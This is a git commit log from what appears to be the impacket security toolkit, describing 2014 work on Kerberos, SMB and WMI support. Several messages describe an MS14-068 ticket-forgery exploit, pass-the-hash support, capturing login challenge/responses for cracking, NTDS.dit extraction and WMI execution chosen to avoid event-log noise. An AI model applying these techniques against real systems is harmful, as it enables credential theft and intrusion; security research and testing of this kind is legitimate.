Date:   Mon Dec 15 16:42:03 2014 +0000

    1) Now Kerberos should work with AES128 and AES256 as well.
    2) If there's a cache, it will look for valid credentials and use them if possible

commit 2c2ac326db71c9c118a2f6a2ba905e6b7439e03c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 15:14:51 2014 +0000

    Making it more general, not tied to RC4

commit 8cd229d7e6623004f76aa3c462062ac74026481c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 15 13:13:54 2014 +0000

    CCache initial implmententation.
    The idea is to be able to use the cached tickets to automatically log in. Still not activated.

commit 285aa21c4547c8cfad147c630828f3ccb80e9f39
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 12 14:12:38 2014 +0000

    Missing import (thanks juan!)

commit f37d3dc9613589a2274b1e5baec563ce0fc96284
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 12 00:48:26 2014 +0000

    Minor change, we don't really need to set the amount of groups staticaly :P

commit 3b7bce75e004346c0e7d5fcd7daa82a9fb2486af
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 12 00:44:34 2014 +0000

    More documentation for getGoldenPAC(), adjusted some values based on [MS-PAC] description.

commit c858ba572eb1b0fb7bd43b1ec7aa304a676efcfc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 19:31:27 2014 +0000

    Minor changes to the hashes code

commit 75dffd7619cd890faccd3178c13d4546a2a1e154
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 19:24:10 2014 +0000

    Hashes support for Kerberos (will only work when cipher == RC4)

commit 6d76dea61b8f634f1d80a412adbac784f01a90de
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 19:15:32 2014 +0000

    Hashes support added. This only works with RC4

commit 519060a53cbca0151f31651b14b339d7de07404b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 14:59:45 2014 +0000

    KERB_ERROR_DATA data type added

commit 4a4d053e0687eb696dd5cd432efb8c502cf700de
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 14:58:43 2014 +0000

    Requirement's update

commit d3cf806ca088a1719c6ee633e8e84e2d1d5daa00
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 14:51:20 2014 +0000

    Added commented lines for MD4 and CRC32 unkeyed checksums if somebody wants to use something different than RSA_MD5

commit fa55414498e00d8d607a3deeba16098cb4eab4ff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 11 13:28:47 2014 +0000

    If we receive a KRB_ERR_GENERIC error we try to extract the NT_ERROR from it.. might fail sometimes..

commit 8ddd84d0507fb2c53f6ba8d5cf5d9fdb7d588f1f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 19:31:58 2014 +0000

    Added smbconnection.getServerDNSDomainName()

commit 6a89785203bfc7af9f064592681514fae65af057
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 16:17:12 2014 +0000

    lcd fix in case os.chdir() fails, improvements to the TGS request

commit 43376416668bdcc6aaca8b31cdf691c2d4a25a04
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 14:41:52 2014 +0000

    PUT and GET weren't working. Hopefully now that's fixed. I wasn't starting the transferClient connection with the forged TGS ticket, and were using the normal user's credentials, hence getting an ACCESS_DENIED.

commit 0719d451b65c31903f878c15132910d649877ee9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Dec 10 13:17:50 2014 +0000

    1) epm.hept_map doesn't work well against w2k03, so we're sticking to the ncacn_np stringBinding
    2) Minor cosmetic things

commit 5e9d7b0031e341a2df578ebd49e32d646fb93252
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 9 16:05:52 2014 +0000

    1) Added Kerberos support for SMB1
    2) When asking for a TGS for cifs service, domain is not needed, could potentially bring problems if the target includes the domain FQDN

commit d869a24fc49a0116cbc16de4d3d57638c4d935bb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 7 11:26:54 2014 +0000

    Fixes https://code.google.com/p/impacket/source/detail?r=1278

commit 23505695b153da6a683d81c86185383c3cbee798
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 7 11:25:32 2014 +0000

    Cannot execute as a script w/o this! ;)

commit d914b02710d0d3e6d5dbc57ef7fd4f066ebd4044
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 6 13:10:42 2014 +0000

    My take on MS14-068. Credit goes to @BiDOrD since he's got a PoC out first. Well done!

commit e9b4176f9c58e4617a70589861b97ea7e3e69350
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 6 06:05:11 2014 +0000

    1) kerberosLogin: now you can specify a TGT/TGS if you have one
    2) fix a bug in smb3 when calculating the signing key

commit 94bcf46ebebb100f06cd5c4831b05dde56ee37ea
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 6 02:12:35 2014 +0000

    typo in AuthorizationData()

commit 166c7b0d364cae10e67816e78db9e6962eca5655
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 5 16:32:59 2014 +0000

    Removing debug dumps.

commit feb172ebc9bbd0da69870e9abf4062a840ec0215
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 5 12:45:37 2014 +0000

    Initial support for Kerberos (see previous commits for the libraries).
    From smb_client use:
    kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
    
    It supports RC4 as of right now.

commit 7ed183aa48ced1e58581ece82cebcea12935ac6f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Dec 5 12:43:45 2014 +0000

    1) Added kerberosLogin() to SMBConnection. Only SMB3 dialect supported so far
    2) Simplified Kerberos structs using dicts

commit 02ef6075f7c37da7239646f5dc63b65671854569
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 4 23:58:30 2014 +0000

    recv() doesn't always return the requested bytes :p

commit fe609d9444982d74e4b53d848962dd8729db2f60
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 4 21:35:43 2014 +0000

    Reverting previous accidental change to this file

commit b0fa3071d340083d291c33838e672d741c6495c0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 4 21:33:38 2014 +0000

    1) First attempt to support kerberos. Right now it's kerberosLogin(). Might be different in the future. Alpha code
    2) Start signing at the second packet sent (this is important for Kerberos signing)

commit 80faca5f6ea8ac62fffae6626abc47b3b4beb7a1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 4 21:31:44 2014 +0000

    Initial Kerberos implementation!
    asn1.py, types.py from https://github.com/mhorowitz/pykrb5 with some modifications
    crypto.py from XX
    Licenses should be OK

commit a023d3ffc6d879b2412c4ef485df7799194c2ddc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 27 13:43:31 2014 +0000

    Since share names can be UNC or just the name of the share, we should check them accordingly.

commit 8903e1211bbdf7424f902d588cf348832e9455b7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 24 13:53:18 2014 +0000

    adding a connectTree test case, with abs path and UNC path

commit 37af2379981a56d663010c2c96754566a0a61054
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 21 21:51:48 2014 +0000

    These fixes should allow using smbfs from Ubuntu to mount a share exported by the smbserver, e.g.:
    mount -t cifs //192.168.1.1/sharename /mnt
    
    1) Fix in the extended authentication mechanism, when a GSSAPI token is not received, and just a straight NTLMSSP structure.
    2) The smb.SMB_FIND_FILE_DIRECTORY_INFO structure wasn't completed when asking for a FindFirst2 with that level
    3) When calling NTCreateAndX, we weren't paying attention to GENERIC_READ and GENERIC_WRITE attributes

commit e9fb70adf5fc83470223d9fbf862b7667f940b6c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 17 18:31:29 2014 +0000

    switching to unicode before processing the actual command. This is needed in case directories/files are unicode encoded. Thanks renaud for the fix. This is part of the bigger https://code.google.com/p/impacket/issues/detail?id=51 issue

commit d746e86b8d51c74acbd851768fbcc03eeb49aff7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 15 23:09:31 2014 +0000

    Only parse the version field if we have some data. Just connected to a samba server and it is supporting SMB3, so this is not only Windows anymore. We should check in the future if Samba servers are returning something in the version field.

commit 2456145b8b7244ec7bc6231ca1c9414634ac7706
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 8 19:17:02 2014 +0000

    Clarifying one message..

commit 0ee8a7043414a015a2d9dbdc58c1729d1d6df6d5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 8 16:05:23 2014 +0000

    Fix trying to work correctly in the scenarios where NTDS.dit is not located in the default location.
    Thanks to mubix for pointing out the registry key to read for NTDS.dit location

commit df4d41c7fb5b56a0cb52408d2cee0534c197dc03
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 30 20:20:31 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=47 reported by carlruth

commit 9d9e3d73b23c688e411707898b695cf1c4370094
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 29 17:45:40 2014 +0000

    Fixes https://code.google.com/p/impacket/issues/detail?id=49 reported by mykesh

commit 2021a4072141aa4d1a2eb36003aa4c097e4b5d85
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 26 17:35:02 2014 +0000

    Fixes https://code.google.com/p/impacket/issues/detail?id=48 reported by Renaud

commit cc78dffc12384b7c13fa3bc921ac5e0f4e267acb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 26 17:33:53 2014 +0000

    Fixes https://code.google.com/p/impacket/issues/detail?id=48 reported by Renaud

commit aaf5ec1c266e5b444d15fec1fa363898af0de570
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 13 18:45:42 2014 +0000

    Typo when parsing the SMB2_SESSION_SETUP data.. It should be packet variable instead of ans!

commit 8115cff6e3d82bdda79e0b16b3e5b02bf5f6ed5c
Author: 6e726d@gmail.com <6e726d@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 3 00:15:29 2014 +0000

    Fixed minor bug when using -hashes parameter.

commit 2b6de58c7e7aac7858b33a0aba6b214963c5ccc1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 31 15:38:19 2014 +0000

    Temp fix for https://code.google.com/p/impacket/issues/detail?id=46 until we figure a better way to solve it.
    We're setting the Max*Size to min(0x100000, value-sent-from-server), which we know it works (Win7/8 sets it to 0x100000).
    In theory win8.1/2012R2 sets it to 0x800000 and for some reason the connection gets closed. However, my tests serves doesn't set the Max*Size to such big number, although a user reported it. More research needed.

commit a7672e4580c66242376045cbe2468b54be01a869
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 26 22:09:44 2014 +0000

     - Added file that contains pcap linktypes.

commit dc80285984cff34a988a34815902c0d256507f2c
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 26 20:30:07 2014 +0000

     - Moved pcap MAGIC outside the pcap header structure.

commit e672dc07950165b7a0f21198ae0415c6b32bcf9e
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Jul 26 20:27:58 2014 +0000

     - Added frequency channel dictionary.

commit 6f94d4e43ebb697efb690bcc6684d50f6b010b11
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 17 16:21:37 2014 +0000

    Moving up to the next dev version

commit 5628648353a977a96c9f06b9dd2f39fc1512a3a6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 17 16:01:46 2014 +0000

    version change

commit b72c5eeea0b52fe1d9492c6ec2de4fcc4911f093
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 17 15:29:23 2014 +0000

    new version

commit 7075ae880609afb4598276dfbb86d358c60775ce
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jul 17 15:03:34 2014 +0000

    New features added

commit 893542cbce582b0c26ebdfd41a7e0db0849877d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 26 13:54:47 2014 +0000

    Updating reference to testcases

commit 7d774b59a092340874ccfcbdebf19f62201625f5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 25 21:00:28 2014 +0000

    Bye bye

commit 82f4a4d4df76c5d0db6eecf8335acff5dff9e4e8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 25 20:58:48 2014 +0000

    You shouldn't be here

commit 669509ec11d07585f1ae2758f2128b14cc8fd1b5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 25 20:55:38 2014 +0000

    1) Moving SMB-RPC to SMB_RPC
    2) Changing inside dot11, test- for test_

commit e07ed49851310c75e3849a077e99b8a3d1656bfd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 23 18:14:15 2014 +0000

    Added command line arguments to set up a share. Now it should be really easy to launch an SMB server :)

commit 9065577d6b2cda0acb1a43441a87ca4c2a4dd68a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 11 15:36:00 2014 +0000

    1) smb.py: added SMB_COM_FLUSH structure
    2) smbserver.py: added SMB_COM_FLUSH command (not active yet)
    3) smbserver.py: added outputJohn call, everytime someone logs in, we output in John format the challenge/response, for further cracking

commit 9d74b68931e5cedb89dd2e9d0a3cbf2fc2d0205c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 19:46:08 2014 +0000

    No need to restrict the max packet size in Windows anymore :)

commit 1246c46784c92597bc89eaf01873fd677b0414a3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 19:33:13 2014 +0000

    infoRecord['EndOfFile'] can be zero, we gotta check that

commit 5b8d2dc2682c770514e27fe4b1e2ad3c1bdecc58
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 18:59:47 2014 +0000

    Adding config option to turn CAP_RPC_REMOTE_APIS on when negotiating the server's capabilities

commit e8453eb12d2ff450c67cb1c47f8a3086031a009e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 18:27:39 2014 +0000

    This changeset adds a minimalistic DCERPC server that is used by the smbserver.
    Why? With modern OSes connecting to the SMB server, you need to have a DCERPC server to serve MS-SRVS and MS-WKST (this last one for OSX clients, not yet implemented), otherwise they will NOT continue the connection.
    1) smbserver.py: added the SRVSServer class, that answers for NetrShareEnum(), NetrShareGetInfo() and NetrServerGetInfo() requests
    2) rpcrt.py: defines the basic DCERPCServer class, as the base class to be used for interfaces

commit b36eee904d2de9cbcdbb8e677101abd51b883460
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 18:09:57 2014 +0000

    Fixed hNetrServerGetInfo() when setting the now non existent InfoStruct field. Test cases updated as well

commit 67e3a13cfbf4824c4135b7df8dcd6fdf5489e0e7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 17:32:53 2014 +0000

    fixed NetrServerGetInfo() structure.

commit abb9d9bb05cf79cc3e3a019a0d11b60f83a2ff0a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jun 10 14:00:56 2014 +0000

    1) Docstrings added to SimpleSMBServer()
    2) Trans2/SMB_SET_FILE_END_OF_FILE_INFO now actually works, lseeking to the proposed allocated size
    3) I'm commenting  os.O_APPEND when opening a file, I think it is not needed and prevents 2) from working. Testing is needed

commit 48412a928c269325d0e473d23c9702f75aba2c38
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 9 17:07:34 2014 +0000

    Setting 127.0.0.1 as the address to bind and connect to the MS-SRVS server

commit a3ba4bbff2565734f0697d83546fcc41d32e5aa4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 9 16:51:07 2014 +0000

    1) Removed the smbserver directory
    2) Now a single smbserver.py example, that contains everything needed to run a simple SMB server and share files

commit a41382de3b12dbe1d0d4044db673716596021ffb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 9 16:49:43 2014 +0000

    1) smb.py: added CAP_RPC_REMOTE_APIS
    2) smbserver.py: Added SimpleSMBServer().. An easy way to launch a SMB Server and configure shares.
    3) smbserver.py: MaxMpxCount is set to 1 now, we don't want to deal with multiple connections from the same target.
    4) srvsvcserver.py: Now works with logger, some methods for processing config files refactored.
    5) srvsvcserver.py: Secondary address now points to \PIPE\srvsvc, this is needed to OSX clients.

commit 943286fa287203498dda1cab5da37aea52b49eec
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jun 5 22:28:55 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=44.
    SMB.retr_file() calls SMB.nt_create_andx() that was trying to open the file RW, which would trigger a problem when trying to read a file from a readonly share.
    I changed SMB.nt_create_andx() so it will accept an accessMask parameter (by default the same it was before, to minimize spash damage). SMB.retr_file() now calls nt_create_andx() with READ ONLY accessMask.

commit 99a3592eebc3a4e9827041ae4ec6891bb8fd4285
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jun 4 18:11:36 2014 +0000

    Stripping useless fstat() calls.

commit 92f1388318293ff2dfe4e2b3a6c46be932cf4f1c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jun 2 17:13:48 2014 +0000

    1) Added warning message when trying to CD to a directory
    2) StdErr is now also being included in the answer

commit f60357d512fda3b8f07da966be637cd69e357c76
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri May 23 18:51:05 2014 +0000

    Solving the same problem described at https://code.google.com/p/impacket/source/detail?r=1145&path=/trunk/examples/secretsdump.py, this time for esentutl.py

commit a0b82a054c53bdc3b54bb39461ea0d77a1b8800c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 19 14:57:30 2014 +0000

    Sync with Core's internal repository. Several fixes on nmb.py. This file should actually be rewritten, it's still using the old pysmb approach.

commit 77df3c13439869ede5b92bc9d035696634efb957
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 14 20:11:52 2014 +0000

    dcomrt: added set_objRef()
    wmi.py: added IWbemClassObject.SpawnInstance() and IWbemClassObject.marshalMe() (the method's naming convention is intentional :) ). PutInstance() and DeleteInstance() seems to be working well

commit 3a397dcdfef1dbbeab1c8de6abe69f1563cacf36
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 12 19:59:38 2014 +0000

    Fixed bug triggered when maxRid was a multiple of SIMULTANEOUS (thanks mubix!)

commit 3c79905a1ad4b24809791219a8a7fb4667b3cf27
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 11 22:59:12 2014 +0000

    type of default share parameter (should be ADMIN$ instead of C$)

commit ce015b25f3e14a6f5062438d57bae9ca56085838
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 7 19:03:42 2014 +0000

    Waiting for the thread to finish.

commit 2e9e0f3988e1bd934b259f3c036f5e93feb3a9c6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 4 22:49:02 2014 +0000

    1) Changes in the .py initial comments
    2) comev.py: Added specific IID used to self the request to
    3) dcomrt: Now we parse and store the minimum auth level required for the interface, used later when binding against it

commit b59b696c5c641b04309a607901c4d21d264b6908
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 17 15:20:44 2014 +0000

    Added -nooutput switch. You won't get the output of the command, but at the same time it doesn't open a connection against 445 for reading it (plus doesn't write any files at the target). Only works when specifying the command to execute through command line

commit 6214791a1257ebbef100ac665be7ce8099047be4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 20:33:05 2014 +0000

    Fixed https://code.google.com/p/impacket/issues/detail?id=42 reported by mubix.
    This is not the best solution so far, but until I figured out where OrderedDict is installed on different Python flavors i'm using this approach.
    I'm also applying the same fix for the ESE database parser that also uses OrderedDict. (used by secretsdump.py and esentutl.py)

commit b731389fe61b77f67ad7ee05ac3dbb769b256ec7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 18:35:19 2014 +0000

    Removing traceback and exception messages

commit c4421dac880966683df5fa4ad67b8325f5d0a50b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 17:59:24 2014 +0000

    Adding propset ID

commit 1cfe0970213c06e576fb70385b24d3be01a93c23
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 17:57:44 2014 +0000

    Reverting previous changeset

commit 78845a0c2d0b4ef3a5d6667df26737872ecc5fae
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 17:48:38 2014 +0000

    Adding propset Id

commit ace7aa33ae2bef083371071ac1ab0a283e488fa6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 16 17:46:10 2014 +0000

     A similar approach to smbexec but executing commands through WMI.
     Main advantage here is it runs under the user (has to be Admin)
     account, not SYSTEM, plus, it doesn't generate noisy messages
     in the event log that smbexec.py does when creating a service.
     Drawback is it needs DCOM, hence, I have to be able to access
     DCOM ports at the target machine.

commit e0bbf550c6c6a8ac21463bc66fe4342fcdb1ff04
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 15 16:57:22 2014 +0000

    Just a cosmetic fix so column separators are printed the same way as headers

commit b5aba39e3351d5720ec989aa1d2ab0c8fd1a43a9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 14 20:40:31 2014 +0000

    Getting better..
    1) Changes on names for structures (all upper case) from all the WMIO part
    2) Now we're generating the methods for a class or instance on the fly, whenever they are called (check the ExecMethod example)
    3) wmiquery.py updates

commit 040a723ba0aee4278d26f43cf0361b0ce2e18b99
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 11 21:14:11 2014 +0000

    DCOMConnection by default doesn't launch an OxidResolver thread. Not needed in most of the cases. Wmiquery.py needs it ;)

commit b85197c12afdfe8e8d72cdfacae618995c7183a7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Apr 11 21:12:39 2014 +0000

    More advance.. ExecQuery is starting to work. When calling GetObject, it will dynamically create the methods :)

commit 430b46ef3b25c6584a6931b6d50c49b4c12b3abf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 9 20:42:50 2014 +0000

    Updates for testcases to work with DCOMConnection

commit 21365a76e4c20f83609e8ed2d69d3ee084e54200
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 9 20:07:23 2014 +0000

    typo on one method's name, it should be test_hSamrQueryDisplayInformation()

commit 431bce6543e5b2309872a851f04cb1c7852fd32d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 9 19:54:21 2014 +0000

    1) Implemented DCOMConnection() to encapsulate all the initial DCE/RPC connectivity
    2) Implemented a ping mechanism to mantain the objects alive in the target servers

commit 54af60449015e51786a5846042a34cb8c021a514
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 9 19:50:43 2014 +0000

    1) Adding support for CimTypeEnum.CIM_TYPE_OBJECT
    2) Fixed some typos on structure/methods definition

commit dc66234b2b9440bc8535c78b2986e7d957c958d4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 8 15:05:39 2014 +0000

    Fix for https://code.google.com/p/impacket/issues/detail?id=41

commit 7c5cc44207cf805662be55e19f14180b5cce9b95
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 7 17:02:18 2014 +0000

    Ability to specify an oxid when creating an interface

commit fa863a80fec27afb9e56de4ee8675286192103f3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 7 16:38:42 2014 +0000

    dcomrt.py: dcomrt now uses a single connection and performs alter_ctx to switch between rpc bindings instead of creating a new connection for each request. Big boost in performance.
    wmiquery.py: RemRelease shouldn't be done against the WBemObject, but against the Enumerator one

commit 8e523b437db038e028d7bb8e8e5b8ebf38793653
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 6 22:06:36 2014 +0000

    Missed RemRelease for the iWbemServices instance

commit 45511be2193ab29f078cf805f9301684204042a4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Apr 6 20:54:40 2014 +0000

    wmi.py: methods for parsing the class for later use
    wmiquery.py: script to test wmiqueries easily ;)

commit 040da58b3dd115d7b1eb77b37cffc1d6664914c4
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Apr 5 19:27:43 2014 +0000

    Now method parameters are parsed/printed when calling GetObject

commit a86fde1a4cd01aff38f16d6e0ad41ebd9922b5a7
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Apr 5 16:11:38 2014 +0000

    Improvements to getProperties() and getValues()

